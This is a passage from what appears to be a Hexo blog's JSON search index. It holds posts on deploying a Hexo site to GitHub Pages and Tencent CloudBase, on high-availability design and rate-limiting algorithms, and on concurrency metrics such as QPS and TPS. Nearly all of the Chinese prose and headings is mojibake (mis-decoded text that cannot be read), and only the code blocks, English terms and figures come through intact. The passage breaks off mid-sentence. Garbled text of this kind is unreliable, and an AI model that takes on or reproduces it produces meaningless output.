éƒ¨ç½²åˆ°github pages\n\n+ éƒ¨ç½²åˆ°github\n\n  ```yml\n  deploy:\n      -\n       type: git\n       repo:\n        github: git@github.com:unix2dos/dohttp.git\n       branch: gh-pages\n  ```\n\n+ å®‰è£…å¹¶éƒ¨ç½²\n\n  ```bash\n  npm install hexo-deployer-git --save\n  \n  hexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n  ```\n\n\n\n### 3.2 éƒ¨ç½²åˆ°è…¾è®¯äº‘cloudbase\n\n+ å¼ºçƒˆå»ºè®®é€‰æ‹©ä¸Šæµ·åœ°åŒº\n\n+ å¼€é€šhexoåº”ç”¨\n\n+ å¼€é€šé™æ€ç½‘ç«™æ‰˜ç®¡\n\n+ å‘½ä»¤\n\n  ```bash\n  tcb login\n  hexo g --config source/_data/next.yml && tcb hosting deploy ./public  -e dohttp-8g3uegkw004f490e -r bj\n  ```\n\n\n\n### 3.3 cloudbaseè‡ªåŠ¨éƒ¨ç½²\n\n+ Github action\n\n  ```yml\n  on: [push] # push ä»£ç æ—¶è§¦å‘\n  jobs: \n      deploy: \n          runs-on: ubuntu-latest\n          name: Tencent Cloudbase Github Action Example\n          steps: \n          - name: Checkout\n            uses: actions/checkout@v2\n          # ä½¿ç”¨äº‘å¼€å‘ Github Action éƒ¨ç½²\n          - name: Deploy static to Tencent CloudBase\n            id: deployStatic\n            uses: TencentCloudBase/cloudbase-action@v1.1.1\n            with: \n              # äº‘å¼€å‘çš„è®¿é—®å¯†é’¥ secretId å’Œ secretKey\n              secretId: ${{ secrets.SECRET_ID }}\n              secretKey: ${{ secrets.SECRET_KEY }}\n              # äº‘å¼€å‘çš„ç¯å¢ƒid\n              envId: ${{ secrets.ENV_ID }}\n              # Github é¡¹ç›®é™æ€æ–‡ä»¶çš„è·¯å¾„\n              staticSrcPath: public\n  ```\n  \n+ ä»“åº“ç§é’¥\n\n  è®¾ç½®`SECRET_ID`,`SECRET_KEY` å’Œcloudbaseçš„`ENV_ID`\n\nâ€‹\t\t\n\n+ è‡ªåŠ¨éƒ¨ç½²æ“ä½œ\n\n  `deploy.sh`\n  \n  ```bash\n  hexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml \n  git add . && git commit -m \"update public\" \n  git pull && git push\n  ```\n\n\n\n\n### 3.4 è…¾è®¯äº‘cdnæ¡¶\n\n```yml\ndeploy:\n    -\n     type: git\n     repo:\n      github: git@unix2dos:unix2dos/unix2dos.github.io.git\n     branch: master\n    - \n     type: cos-cdn\n     cloud: tencent\n     bucket: blog-1300740185\n     region: ap-beijing\n     secretId: ***\n     secretKey: ***\n```\n\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://cloud.tencent.com/document/product/876/47006\n\n","tags":["hexo"],"categories":["åšå®¢"]},{"title":"é«˜å¯ç”¨è®¾è®¡æŒ‡å—","url":"%2Fp%2F76375ae8.html","content":"\né«˜å¯ç”¨æè¿°çš„æ˜¯ä¸€ä¸ªç³»ç»Ÿåœ¨å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯å¯ç”¨çš„ï¼Œå¯ä»¥ä¸ºæˆ‘ä»¬æä¾›æœåŠ¡çš„ã€‚é«˜å¯ç”¨ä»£è¡¨ç³»ç»Ÿå³ä½¿åœ¨å‘ç”Ÿç¡¬ä»¶æ•…éšœæˆ–è€…ç³»ç»Ÿå‡çº§çš„æ—¶å€™ï¼ŒæœåŠ¡ä»ç„¶æ˜¯å¯ç”¨çš„ã€‚\n\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨å¤šå°‘ä¸ª 9 æ¥è¯„åˆ¤ä¸€ä¸ªç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œæ¯”å¦‚ 99.9999% å°±æ˜¯ä»£è¡¨è¯¥ç³»ç»Ÿåœ¨æ‰€æœ‰çš„è¿è¡Œæ—¶é—´ä¸­åªæœ‰ 0.0001% çš„æ—¶é—´æ˜¯ä¸å¯ç”¨çš„ï¼Œè¿™æ ·çš„ç³»ç»Ÿå°±æ˜¯éå¸¸éå¸¸é«˜å¯ç”¨çš„äº†ï¼\n\n<!-- more -->\n\n# 1. æé«˜ç³»ç»Ÿé«˜å¯ç”¨\n\n### 1.1 æ³¨é‡ä»£ç è´¨é‡ï¼Œæµ‹è¯•ä¸¥æ ¼æŠŠå…³\n\nå¤§å®¶éƒ½å–œæ¬¢è°ˆé™æµã€é™çº§ã€ç†”æ–­ï¼Œä½†æ˜¯æˆ‘è§‰å¾—ä»ä»£ç è´¨é‡è¿™ä¸ªæºå¤´æŠŠå…³æ˜¯é¦–å…ˆè¦åšå¥½çš„ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…ã€‚æ¯”è¾ƒå®é™…å¯ç”¨çš„å°±æ˜¯ CodeReviewï¼Œä¸è¦åœ¨ä¹æ¯å¤©å¤šèŠ±çš„é‚£ 1 ä¸ªå°æ—¶å·¦å³çš„æ—¶é—´ï¼Œä½œç”¨å¯å¤§ç€å‘¢ï¼\n\n### 1.2 ä½¿ç”¨é›†ç¾¤ï¼Œå‡å°‘å•ç‚¹æ•…éšœ\n\nå…ˆæ‹¿å¸¸ç”¨çš„ Redis ä¸¾ä¸ªä¾‹å­ï¼æˆ‘ä»¬å¦‚ä½•ä¿è¯æˆ‘ä»¬çš„ Redis ç¼“å­˜é«˜å¯ç”¨å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ä½¿ç”¨é›†ç¾¤ï¼Œé¿å…å•ç‚¹æ•…éšœã€‚å½“æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ª Redis å®ä¾‹ä½œä¸ºç¼“å­˜çš„æ—¶å€™ï¼Œè¿™ä¸ª Redis å®ä¾‹æŒ‚äº†ä¹‹åï¼Œæ•´ä¸ªç¼“å­˜æœåŠ¡å¯èƒ½å°±æŒ‚äº†ã€‚ä½¿ç”¨äº†é›†ç¾¤ä¹‹åï¼Œå³ä½¿ä¸€å° Redis å®ä¾‹æŒ‚äº†ï¼Œä¸åˆ°ä¸€ç§’å°±ä¼šæœ‰å¦å¤–ä¸€å° Redis å®ä¾‹é¡¶ä¸Šã€‚\n\n### 1.3 é™æµ\n\næµé‡æ§åˆ¶ï¼ˆflow controlï¼‰ï¼Œå…¶åŸç†æ˜¯ç›‘æ§åº”ç”¨æµé‡çš„ QPS æˆ–å¹¶å‘çº¿ç¨‹æ•°ç­‰æŒ‡æ ‡ï¼Œå½“è¾¾åˆ°æŒ‡å®šçš„é˜ˆå€¼æ—¶å¯¹æµé‡è¿›è¡Œæ§åˆ¶ï¼Œä»¥é¿å…è¢«ç¬æ—¶çš„æµé‡é«˜å³°å†²å®ï¼Œä»è€Œä¿éšœåº”ç”¨çš„é«˜å¯ç”¨æ€§ã€‚\n\n### 1.4 è¶…æ—¶å’Œé‡è¯•æœºåˆ¶è®¾ç½®\n\nä¸€æ—¦ç”¨æˆ·è¯·æ±‚è¶…è¿‡æŸä¸ªæ—¶é—´çš„å¾—ä¸åˆ°å“åº”ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚è¿™ä¸ªæ˜¯éå¸¸é‡è¦çš„ï¼Œå¾ˆå¤šçº¿ä¸Šç³»ç»Ÿæ•…éšœéƒ½æ˜¯å› ä¸ºæ²¡æœ‰è¿›è¡Œè¶…æ—¶è®¾ç½®æˆ–è€…è¶…æ—¶è®¾ç½®çš„æ–¹å¼ä¸å¯¹å¯¼è‡´çš„ã€‚æˆ‘ä»¬åœ¨è¯»å–ç¬¬ä¸‰æ–¹æœåŠ¡çš„æ—¶å€™ï¼Œå°¤å…¶é€‚åˆè®¾ç½®è¶…æ—¶å’Œé‡è¯•æœºåˆ¶ã€‚\n\nä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨ä¸€äº› RPC æ¡†æ¶çš„æ—¶å€™ï¼Œè¿™äº›æ¡†æ¶éƒ½è‡ªå¸¦çš„è¶…æ—¶é‡è¯•çš„é…ç½®ã€‚å¦‚æœä¸è¿›è¡Œè¶…æ—¶è®¾ç½®å¯èƒ½ä¼šå¯¼è‡´è¯·æ±‚å“åº”é€Ÿåº¦æ…¢ï¼Œç”šè‡³å¯¼è‡´è¯·æ±‚å †ç§¯è¿›è€Œè®©ç³»ç»Ÿæ— æ³•å†å¤„ç†è¯·æ±‚ã€‚é‡è¯•çš„æ¬¡æ•°ä¸€èˆ¬è®¾ä¸º 3 æ¬¡ï¼Œå†å¤šæ¬¡çš„é‡è¯•æ²¡æœ‰å¥½å¤„ï¼Œåè€Œä¼šåŠ é‡æœåŠ¡å™¨å‹åŠ›ï¼ˆéƒ¨åˆ†åœºæ™¯ä½¿ç”¨å¤±è´¥é‡è¯•æœºåˆ¶ä¼šä¸å¤ªé€‚åˆï¼‰ã€‚\n\n### 1.5 ç†”æ–­æœºåˆ¶\n\nè¶…æ—¶å’Œé‡è¯•æœºåˆ¶è®¾ç½®ä¹‹å¤–ï¼Œç†”æ–­æœºåˆ¶ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚ ç†”æ–­æœºåˆ¶è¯´çš„æ˜¯ç³»ç»Ÿè‡ªåŠ¨æ”¶é›†æ‰€ä¾èµ–æœåŠ¡çš„èµ„æºä½¿ç”¨æƒ…å†µå’Œæ€§èƒ½æŒ‡æ ‡ï¼Œå½“æ‰€ä¾èµ–çš„æœåŠ¡æ¶åŒ–æˆ–è€…è°ƒç”¨å¤±è´¥æ¬¡æ•°è¾¾åˆ°æŸä¸ªé˜ˆå€¼çš„æ—¶å€™å°±è¿…é€Ÿå¤±è´¥ï¼Œè®©å½“å‰ç³»ç»Ÿç«‹å³åˆ‡æ¢ä¾èµ–å…¶ä»–å¤‡ç”¨æœåŠ¡ã€‚ æ¯”è¾ƒå¸¸ç”¨çš„æµé‡æ§åˆ¶å’Œç†”æ–­é™çº§æ¡†æ¶æ˜¯ Netflix çš„ Hystrix å’Œ alibaba çš„ Sentinelã€‚\n\n### 1.6 å¼‚æ­¥è°ƒç”¨\n\næ¯”å¦‚ç”¨æˆ·åœ¨æäº¤è®¢å•ä¹‹åï¼Œä¸èƒ½ç«‹å³è¿”å›ç”¨æˆ·è®¢å•æäº¤æˆåŠŸï¼Œéœ€è¦åœ¨æ¶ˆæ¯é˜Ÿåˆ—çš„è®¢å•æ¶ˆè´¹è€…è¿›ç¨‹çœŸæ­£å¤„ç†å®Œè¯¥è®¢å•ä¹‹åï¼Œç”šè‡³å‡ºåº“åï¼Œå†é€šè¿‡ç”µå­é‚®ä»¶æˆ–çŸ­ä¿¡é€šçŸ¥ç”¨æˆ·è®¢å•æˆåŠŸã€‚é™¤äº†å¯ä»¥åœ¨ç¨‹åºä¸­å®ç°å¼‚æ­¥ä¹‹å¤–ï¼Œæˆ‘ä»¬å¸¸å¸¸è¿˜ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥é€šè¿‡å¼‚æ­¥å¤„ç†æé«˜ç³»ç»Ÿæ€§èƒ½ï¼ˆå‰Šå³°ã€å‡å°‘å“åº”æ‰€éœ€æ—¶é—´ï¼‰å¹¶ä¸”å¯ä»¥é™ä½ç³»ç»Ÿè€¦åˆæ€§ã€‚\n\n### 1.7 ä½¿ç”¨ç¼“å­˜\n\nå¦‚æœæˆ‘ä»¬çš„ç³»ç»Ÿå±äºå¹¶å‘é‡æ¯”è¾ƒé«˜çš„è¯ï¼Œå¦‚æœæˆ‘ä»¬å•çº¯ä½¿ç”¨æ•°æ®åº“çš„è¯ï¼Œå½“å¤§é‡è¯·æ±‚ç›´æ¥è½åˆ°æ•°æ®åº“å¯èƒ½æ•°æ®åº“å°±ä¼šç›´æ¥æŒ‚æ‰ã€‚ä½¿ç”¨ç¼“å­˜ç¼“å­˜çƒ­ç‚¹æ•°æ®ï¼Œå› ä¸ºç¼“å­˜å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œæ‰€ä»¥é€Ÿåº¦ç›¸å½“åœ°å¿«ï¼\n\n# 2. å¸¸è§é™æµç®—æ³•\n\n### 2.1 å›ºå®šçª—å£è®¡æ•°å™¨ç®—æ³•\n\nå›ºå®šçª—å£å…¶å®å°±æ˜¯æ—¶é—´çª—å£ã€‚å›ºå®šçª—å£è®¡æ•°å™¨ç®—æ³•è§„å®šäº†æˆ‘ä»¬å•ä½æ—¶é—´å¤„ç†çš„è¯·æ±‚æ•°é‡ã€‚\n\nå‡å¦‚æˆ‘ä»¬è§„å®šç³»ç»Ÿä¸­æŸä¸ªæ¥å£ 1 åˆ†é’Ÿåªèƒ½è®¿é—® 33 æ¬¡çš„è¯ï¼Œä½¿ç”¨å›ºå®šçª—å£è®¡æ•°å™¨ç®—æ³•çš„å®ç°æ€è·¯å¦‚ä¸‹ï¼š\n\n- ç»™å®šä¸€ä¸ªå˜é‡ `counter` æ¥è®°å½•å½“å‰æ¥å£å¤„ç†çš„è¯·æ±‚æ•°é‡ï¼Œåˆå§‹å€¼ä¸º 0ï¼ˆä»£è¡¨æ¥å£å½“å‰ 1 åˆ†é’Ÿå†…è¿˜æœªå¤„ç†è¯·æ±‚ï¼‰ã€‚\n- 1 åˆ†é’Ÿä¹‹å†…æ¯å¤„ç†ä¸€ä¸ªè¯·æ±‚ä¹‹åå°±å°† `counter+1` ï¼Œå½“ `counter=33` ä¹‹åï¼ˆä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ 1 åˆ†é’Ÿå†…æ¥å£å·²ç»è¢«è®¿é—® 33 æ¬¡çš„è¯ï¼‰ï¼Œåç»­çš„è¯·æ±‚å°±ä¼šè¢«å…¨éƒ¨æ‹’ç»ã€‚\n- ç­‰åˆ° 1 åˆ†é’Ÿç»“æŸåï¼Œå°† `counter` é‡ç½® 0ï¼Œé‡æ–°å¼€å§‹è®¡æ•°ã€‚\n\n<img src=\"é«˜å¯ç”¨è®¾è®¡æŒ‡å—/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f38642f31352f38646564376132623930653134383230393366393266666635353562333631352e706e67\" alt=\"å›ºå®šçª—å£è®¡æ•°å™¨ç®—æ³•\" style=\"zoom:100%;\" />\n\n### 2.2 æ»‘åŠ¨çª—å£è®¡æ•°å™¨ç®—æ³•\n\næ»‘åŠ¨çª—å£è®¡æ•°å™¨ç®—æ³•ç›¸æ¯”äºå›ºå®šçª—å£è®¡æ•°å™¨ç®—æ³•çš„ä¼˜åŒ–åœ¨äºï¼šå®ƒæŠŠæ—¶é—´ä»¥ä¸€å®šæ¯”ä¾‹åˆ†ç‰‡ ã€‚\n\nä¾‹å¦‚æˆ‘ä»¬çš„æ¥å£é™æµæ¯åˆ†é’Ÿå¤„ç† 60 ä¸ªè¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ 1 åˆ†é’Ÿåˆ†ä¸º 60 ä¸ªçª—å£ã€‚æ¯éš” 1 ç§’ç§»åŠ¨ä¸€æ¬¡ï¼Œæ¯ä¸ªçª—å£ä¸€ç§’åªèƒ½å¤„ç† ä¸å¤§äº 60(è¯·æ±‚æ•°)/60ï¼ˆçª—å£æ•°ï¼‰ çš„è¯·æ±‚ï¼Œ å¦‚æœå½“å‰çª—å£çš„è¯·æ±‚è®¡æ•°æ€»å’Œè¶…è¿‡äº†é™åˆ¶çš„æ•°é‡çš„è¯å°±ä¸å†å¤„ç†å…¶ä»–è¯·æ±‚ã€‚\n\n![æ»‘åŠ¨çª—å£è®¡æ•°å™¨ç®—æ³•](é«˜å¯ç”¨è®¾è®¡æŒ‡å—/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f61652f31352f61653464336364313465666238646337303436643639316339303236343731352e706e67)\n\n### 2.3 æ¼æ¡¶ç®—æ³•\n\næˆ‘ä»¬å¯ä»¥æŠŠå‘è¯·æ±‚çš„åŠ¨ä½œæ¯”ä½œæˆæ³¨æ°´åˆ°æ¡¶ä¸­ï¼Œæˆ‘ä»¬å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹å¯ä»¥æ¯”å–»ä¸ºæ¼æ¡¶æ¼æ°´ã€‚æˆ‘ä»¬å¾€æ¡¶ä¸­ä»¥ä»»æ„é€Ÿç‡æµå…¥æ°´ï¼Œä»¥ä¸€å®šé€Ÿç‡æµå‡ºæ°´ã€‚å½“æ°´è¶…è¿‡æ¡¶æµé‡åˆ™ä¸¢å¼ƒï¼Œå› ä¸ºæ¡¶å®¹é‡æ˜¯ä¸å˜çš„ï¼Œä¿è¯äº†æ•´ä½“çš„é€Ÿç‡ã€‚\n\nå¦‚æœæƒ³è¦å®ç°è¿™ä¸ªç®—æ³•çš„è¯ä¹Ÿå¾ˆç®€å•ï¼Œå‡†å¤‡ä¸€ä¸ªé˜Ÿåˆ—ç”¨æ¥ä¿å­˜è¯·æ±‚ï¼Œç„¶åæˆ‘ä»¬å®šæœŸä»é˜Ÿåˆ—ä¸­æ‹¿è¯·æ±‚æ¥æ‰§è¡Œå°±å¥½äº†ï¼ˆå’Œæ¶ˆæ¯é˜Ÿåˆ—å‰Šå³°/é™æµçš„æ€æƒ³æ˜¯ä¸€æ ·çš„ï¼‰ã€‚\n\n![æ¼æ¡¶ç®—æ³•](é«˜å¯ç”¨è®¾è®¡æŒ‡å—/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f37352f30332f37353933386431303130313338636536366533386336656430333932663130332e706e67)\n\n### 2.4 ä»¤ç‰Œæ¡¶ç®—æ³•\n\nä»¤ç‰Œæ¡¶ç®—æ³•ä¹Ÿæ¯”è¾ƒç®€å•ã€‚å’Œæ¼æ¡¶ç®—æ³•ç®—æ³•ä¸€æ ·ï¼Œæˆ‘ä»¬çš„ä¸»è§’è¿˜æ˜¯æ¡¶ã€‚ä¸è¿‡ç°åœ¨æ¡¶é‡Œè£…çš„æ˜¯ä»¤ç‰Œäº†ï¼Œè¯·æ±‚åœ¨è¢«å¤„ç†ä¹‹å‰éœ€è¦æ‹¿åˆ°ä¸€ä¸ªä»¤ç‰Œï¼Œè¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åå°†è¿™ä¸ªä»¤ç‰Œä¸¢å¼ƒï¼ˆåˆ é™¤ï¼‰ã€‚æˆ‘ä»¬æ ¹æ®é™æµå¤§å°ï¼ŒæŒ‰ç…§ä¸€å®šçš„é€Ÿç‡å¾€æ¡¶é‡Œæ·»åŠ ä»¤ç‰Œã€‚å¦‚æœæ¡¶è£…æ»¡äº†ï¼Œå°±ä¸èƒ½ç»§ç»­å¾€é‡Œé¢ç»§ç»­æ·»åŠ ä»¤ç‰Œäº†ã€‚\n\n![ä»¤ç‰Œæ¡¶ç®—æ³•](é«˜å¯ç”¨è®¾è®¡æŒ‡å—/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f65632f39332f65636130653565616133356461633933386336373366656366326563396139332e706e67)\n","tags":["é«˜å¯ç”¨"],"categories":["é«˜å¯ç”¨"]},{"title":"é«˜å¹¶å‘çš„æ€§èƒ½æŒ‡æ ‡å’Œè®¾è®¡","url":"%2Fp%2Fb75de0de.html","content":"\né«˜å¹¶å‘ï¼ˆHigh Concurrencyï¼‰æ˜¯äº’è”ç½‘åˆ†å¸ƒå¼ç³»ç»Ÿæ¶æ„è®¾è®¡ä¸­å¿…é¡»è€ƒè™‘çš„å› ç´ ä¹‹ä¸€ï¼Œå®ƒé€šå¸¸æ˜¯æŒ‡é€šè¿‡è®¾è®¡ä¿è¯ç³»ç»Ÿèƒ½å¤ŸåŒæ—¶å¹¶è¡Œå¤„ç†å¾ˆå¤šè¯·æ±‚ã€‚\n\n<!-- more -->\n\n# 1. æ€§èƒ½æŒ‡æ ‡\n\n### 1.1 QPSï¼Œæ¯ç§’æŸ¥è¯¢\n\nQPSï¼šQueries Per Second   æ„æ€æ˜¯â€œæ¯ç§’æŸ¥è¯¢ç‡â€ï¼Œæ˜¯ä¸€å°æœåŠ¡å™¨æ¯ç§’èƒ½å¤Ÿå¤„ç†çš„æŸ¥è¯¢æ¬¡æ•°ã€‚\nç”¨æˆ·å‘èµ·æŸ¥è¯¢è¯·æ±‚åˆ°æœåŠ¡å™¨åšå‡ºå“åº”è¿™ç®—ä¸€æ¬¡ï¼Œä¸€ç§’å†…ç”¨æˆ·å®Œæˆäº†50æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œé‚£æ­¤æ—¶æœåŠ¡å™¨QPSå°±æ˜¯50ã€‚\n\n### 1.2 TPSï¼Œæ¯ç§’äº‹åŠ¡\n\nTPSï¼šæ˜¯TransactionsPerSecondçš„ç¼©å†™ï¼ŒæœåŠ¡å™¨æ¯ç§’å¤„ç†çš„äº‹åŠ¡æ•°ã€‚ä¸€ä¸ªäº‹ç‰©æ˜¯ç”¨æˆ·å‘èµ·æŸ¥è¯¢è¯·æ±‚åˆ°æœåŠ¡å™¨åšå‡ºå“åº”è¿™ç®—ä¸€æ¬¡ã€‚\n\nè®¿é—® â€˜order.htmlâ€™ è¿™ä¸ªé¡µé¢,æ˜¯ä¸€ä¸ªTPSã€‚è€Œorder.htmlâ€™ é¡µé¢å¯èƒ½è¯·æ±‚äº†3æ¬¡æœåŠ¡å™¨ï¼ˆå¦‚è°ƒç”¨äº†cssã€jsã€orderæ¥å£ï¼‰ï¼Œè¿™å®é™…å°±ç®—äº§ç”Ÿäº†ä¸‰ä¸ªQPSã€‚\n\n### 1.3 RTï¼Œå“åº”æ—¶é—´\n\nå“åº”æ—¶é—´ï¼Œä¸€èˆ¬å–å¹³å‡å“åº”æ—¶é—´ï¼Œå¤„ç†**ä¸€æ¬¡è¯·æ±‚**æ‰€éœ€è¦çš„å¹³å‡å¤„ç†æ—¶é—´ï¼Œå®ƒçš„æ•°å€¼å¤§å°ç›´æ¥ååº”äº†ç³»ç»Ÿçš„å¿«æ…¢ã€‚\n\nä¸€èˆ¬ç³»ç»ŸRT 100ms ä»¥å†…æ˜¯æ¯”è¾ƒæ­£å¸¸çš„ï¼Œ300ms å‹‰å¼ºå¯ä»¥æ¥å—ï¼Œ1sçš„è¯å†åŠ ä¸Šä¸€äº›å…¶ä»–çš„å¤–å› ï¼Œç»™ç”¨æˆ·çš„ä½“éªŒå°±æ˜¯å®å®åœ¨åœ¨çš„ä¸çˆ½äº†ã€‚\n\n### 1.4 å¹¶å‘æ•°\n\nå¹¶å‘æ•°æ˜¯æŒ‡ç³»ç»ŸåŒæ—¶èƒ½å¤„ç†çš„è¯·æ±‚æ•°é‡ï¼Œ**ä¸€èˆ¬é€šè¿‡çº¿ç¨‹å’ŒCPUæ ¸æ•°æ¥å†³å®š**ï¼Œå¹¶å‘æ•°ååº”äº†ç³»ç»Ÿçš„è´Ÿè½½èƒ½åŠ›\n\n### 1.5 ååé‡\n\nç³»ç»Ÿçš„ååé‡ï¼ˆæ‰¿å‹èƒ½åŠ›ï¼‰ä¸requestå¯¹CPUçš„æ¶ˆè€—ã€å¤–éƒ¨æ¥å£ã€IOç­‰ç­‰ç´§å¯†å…³è”ã€‚å•ä¸ªrequest å¯¹CPUæ¶ˆè€—è¶Šé«˜ï¼Œå¤–éƒ¨ç³»ç»Ÿæ¥å£ã€IOé€Ÿåº¦è¶Šæ…¢ï¼Œç³»ç»Ÿååèƒ½åŠ›è¶Šä½ï¼Œåä¹‹è¶Šé«˜ã€‚\n\n\nç³»ç»Ÿååé‡å‡ ä¸ªé‡è¦å‚æ•°ï¼šQPSï¼ˆTPSï¼‰ã€å¹¶å‘æ•°ã€å“åº”æ—¶é—´ã€‚\n\n+ QPSï¼ˆTPSï¼‰ï¼šï¼ˆQuery Per Secondï¼‰æ¯ç§’é’Ÿrequest/äº‹åŠ¡ æ•°é‡\n+ å¹¶å‘æ•°ï¼š å¹¶å‘æ•°æ˜¯æŒ‡ç³»ç»ŸåŒæ—¶èƒ½å¤„ç†çš„è¯·æ±‚æ•°é‡ï¼Œä¸€èˆ¬é€šè¿‡çº¿ç¨‹å’ŒCPUæ ¸æ•°æ¥å†³å®šï¼Œå¹¶å‘æ•°ååº”äº†ç³»ç»Ÿçš„è´Ÿè½½èƒ½åŠ›\n+ å“åº”æ—¶é—´ï¼š ä¸€èˆ¬å–è¯·æ±‚çš„å¹³å‡å“åº”æ—¶é—´\n\n### 1.6 è®¡ç®—å…¬å¼\n\n> QPS = å¹¶å‘é‡ / å¹³å‡å“åº”æ—¶é—´\n\n0.5s çš„å¤„ç†æ—¶é—´ï¼Œæˆ‘ä»¬è‡³å°‘éœ€è¦ 500 çš„å¹¶å‘é‡ï¼Œæ‰èƒ½è¾¾åˆ° 1000qps\n\n0.1s çš„è¯ï¼Œå› ä¸ºå¤„ç†æ—¶é—´å˜å¿«äº†ï¼Œæ‰€ä»¥ç°åœ¨åªéœ€è¦ 100 çš„å¹¶å‘é‡ï¼Œå°±å¯ä»¥è½»æ¾è¾¾åˆ° 1000qps çš„èƒ½åŠ›äº†\n\nå¦‚æœå¹¶å‘é‡è¿˜æ˜¯ 500ï¼Œæˆ‘ä»¬çš„ qps ç”šè‡³èƒ½åˆ° 5000\n\n\n\n# 2. è®¾è®¡é«˜å¹¶å‘ç³»ç»Ÿ\n\n### 2.1 ç³»ç»Ÿæ‹†åˆ†\n\nå°†ä¸€ä¸ªç³»ç»Ÿæ‹†åˆ†ä¸ºå¤šä¸ªå­ç³»ç»Ÿï¼Œç”¨ dubbo æ¥æã€‚ç„¶åæ¯ä¸ªç³»ç»Ÿè¿ä¸€ä¸ªæ•°æ®åº“ï¼Œè¿™æ ·æœ¬æ¥å°±ä¸€ä¸ªåº“ï¼Œç°åœ¨å¤šä¸ªæ•°æ®åº“ï¼Œä¸ä¹Ÿå¯ä»¥æ‰›é«˜å¹¶å‘ä¹ˆã€‚\n\n### 2.2 ç¼“å­˜\n\nå¤§éƒ¨åˆ†çš„é«˜å¹¶å‘åœºæ™¯ï¼Œéƒ½æ˜¯è¯»å¤šå†™å°‘ï¼Œé‚£ä½ å®Œå…¨å¯ä»¥åœ¨æ•°æ®åº“å’Œç¼“å­˜é‡Œéƒ½å†™ä¸€ä»½ï¼Œç„¶åè¯»çš„æ—¶å€™å¤§é‡èµ°ç¼“å­˜ä¸å°±å¾—äº†ã€‚æ¯•ç«Ÿäººå®¶ redis è½»è½»æ¾æ¾å•æœºå‡ ä¸‡çš„å¹¶å‘ã€‚æ‰€ä»¥ä½ å¯ä»¥è€ƒè™‘è€ƒè™‘ä½ çš„é¡¹ç›®é‡Œï¼Œé‚£äº›æ‰¿è½½ä¸»è¦è¯·æ±‚çš„è¯»åœºæ™¯ï¼Œæ€ä¹ˆç”¨ç¼“å­˜æ¥æŠ—é«˜å¹¶å‘ã€‚\n\n### 2.3 MQ\n\næ¯”å¦‚è¯´ä¸€ä¸ªä¸šåŠ¡æ“ä½œé‡Œè¦é¢‘ç¹ææ•°æ®åº“å‡ åæ¬¡ï¼Œå¢åˆ æ”¹å¢åˆ æ”¹ï¼Œç–¯äº†ã€‚é‚£é«˜å¹¶å‘ç»å¯¹ææŒ‚ä½ çš„ç³»ç»Ÿã€‚\n\nç”¨ MQ å§ï¼Œå¤§é‡çš„å†™è¯·æ±‚çŒå…¥ MQ é‡Œï¼Œæ’é˜Ÿæ…¢æ…¢ç©å„¿ï¼Œåè¾¹ç³»ç»Ÿæ¶ˆè´¹åæ…¢æ…¢å†™ï¼Œæ§åˆ¶åœ¨ mysql æ‰¿è½½èŒƒå›´ä¹‹å†…å¦‚ä½•ç”¨ MQ æ¥å¼‚æ­¥å†™ï¼Œæå‡å¹¶å‘æ€§ã€‚MQ å•æœºæŠ—å‡ ä¸‡å¹¶å‘ä¹Ÿæ˜¯ ok çš„ã€‚\n\n### 2.4 åˆ†åº“åˆ†è¡¨\n\nåˆ†åº“åˆ†è¡¨ï¼Œå¯èƒ½åˆ°äº†æœ€åæ•°æ®åº“å±‚é¢è¿˜æ˜¯å…ä¸äº†æŠ—é«˜å¹¶å‘çš„è¦æ±‚ï¼Œå¥½å§ï¼Œé‚£ä¹ˆå°±å°†ä¸€ä¸ªæ•°æ®åº“æ‹†åˆ†ä¸ºå¤šä¸ªåº“ï¼Œå¤šä¸ªåº“æ¥æ‰›æ›´é«˜çš„å¹¶å‘ï¼›ç„¶åå°†ä¸€ä¸ªè¡¨æ‹†åˆ†ä¸ºå¤šä¸ªè¡¨ï¼Œæ¯ä¸ªè¡¨çš„æ•°æ®é‡ä¿æŒå°‘ä¸€ç‚¹ï¼Œæé«˜ sql è·‘çš„æ€§èƒ½ã€‚\n\n### 2.5 è¯»å†™åˆ†ç¦»\n\nè¯»å†™åˆ†ç¦»ï¼Œè¿™ä¸ªå°±æ˜¯è¯´å¤§éƒ¨åˆ†æ—¶å€™æ•°æ®åº“å¯èƒ½ä¹Ÿæ˜¯è¯»å¤šå†™å°‘ï¼Œæ²¡å¿…è¦æ‰€æœ‰è¯·æ±‚éƒ½é›†ä¸­åœ¨ä¸€ä¸ªåº“ä¸Šå§ï¼Œå¯ä»¥æä¸ªä¸»ä»æ¶æ„ï¼Œä¸»åº“å†™å…¥ï¼Œä»åº“è¯»å–ï¼Œæä¸€ä¸ªè¯»å†™åˆ†ç¦»ã€‚è¯»æµé‡å¤ªå¤šçš„æ—¶å€™ï¼Œè¿˜å¯ä»¥åŠ æ›´å¤šçš„ä»åº“ã€‚\n\n### 2.6 ElasticSearch\n\nes æ˜¯åˆ†å¸ƒå¼çš„ï¼Œå¯ä»¥éšä¾¿æ‰©å®¹ï¼Œåˆ†å¸ƒå¼å¤©ç„¶å°±å¯ä»¥æ”¯æ’‘é«˜å¹¶å‘ï¼Œå› 